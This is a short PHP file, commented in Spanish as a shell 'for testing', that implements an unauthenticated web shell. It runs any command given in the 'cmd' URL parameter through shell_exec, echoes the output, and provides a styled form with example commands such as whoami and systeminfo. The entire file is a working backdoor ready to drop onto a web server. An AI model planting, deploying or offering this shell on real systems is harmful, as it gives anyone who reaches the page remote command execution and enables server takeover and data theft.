<?php
// Simple PHP Shell para testing
// USO: shell.php?cmd=whoami

if(isset($_GET['cmd'])) {
    echo "<pre>";
    echo htmlspecialchars(shell_exec($_GET['cmd']));
    echo "</pre>";
} else {
?>
<!DOCTYPE html>
<html>
<head>
    <title>Web Shell</title>
    <style>
        body { background: #1a1a2e; color: #fff; font-family: monospace; padding: 20px; }
        input { width: 80%; padding: 10px; background: #333; color: #0f0; border: 1px solid #0f0; }
        button { padding: 10px 20px; background: #0f0; color: #000; border: none; cursor: pointer; }
        pre { background: #000; padding: 15px; border: 1px solid #0f0; overflow-x: auto; }
        h1 { color: #0f0; }
    </style>
</head>
<body>
    <h1>🐚 Web Shell</h1>
    <form method="GET">
        <input type="text" name="cmd" placeholder="Introduce un comando..." autofocus>
        <button type="submit">Ejecutar</button>
    </form>
    <p style="color:#888;">Ejemplos: whoami, dir, ipconfig, systeminfo</p>
</body>
</html>
<?php
}
?>
